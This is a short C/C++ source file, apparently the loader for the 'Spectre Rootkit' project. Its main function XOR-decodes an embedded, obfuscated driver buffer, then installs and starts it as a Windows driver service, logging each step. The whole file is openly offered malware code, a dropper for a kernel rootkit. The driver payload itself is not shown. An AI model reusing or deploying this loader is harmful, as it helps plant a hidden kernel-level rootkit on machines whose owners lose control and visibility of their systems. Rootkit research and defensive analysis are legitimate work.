/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#include "common.h"
#include "DriverServiceInstaller.h"
#include "SpectreDriver.h"

int main()
{
    BOOLEAN success;
    DriverServiceInstaller spectreInstaller;
    ULONG i;

    //
    // Deobfuscate the driver buffer.
    //
    for (i = 0; i < sizeof(spectre_driver); i++)
    {
        spectre_driver[i] ^= SPECTRE_XOR_KEY;
    }

    DBGPRINT("main: Deobfuscated the Spectre Rootkit driver.");

    //
    // Install the driver.
    //
    success = spectreInstaller.InstallDriver(spectre_driver, sizeof(spectre_driver));
    if (success == FALSE)
    {
        DBGPRINT("main: Failed to install the Spectre Rootkit driver.");
        return FALSE;
    }

    DBGPRINT("main: Installed the Spectre Rootkit driver.");

    //
    // Start the driver.
    //
    success = spectreInstaller.StartDriver();
    if (success == FALSE)
    {
        DBGPRINT("main: Failed to start the Spectre Rootkit driver.");
        return FALSE;
    }

    DBGPRINT("main: Started the Spectre Rootkit driver.");
    return TRUE;
}